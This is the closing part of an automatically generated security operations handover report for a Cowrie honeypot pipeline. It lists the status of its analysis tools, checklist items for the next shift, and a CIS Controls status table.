| Tool 29  | False Positive Tracker      | ✅ 93 filtered (15.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 28 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 36 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 393 priority case(s) shown individually · 16 recon entry/entries in table (4 group(s) consolidating 90 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-04T17:11:18Z_
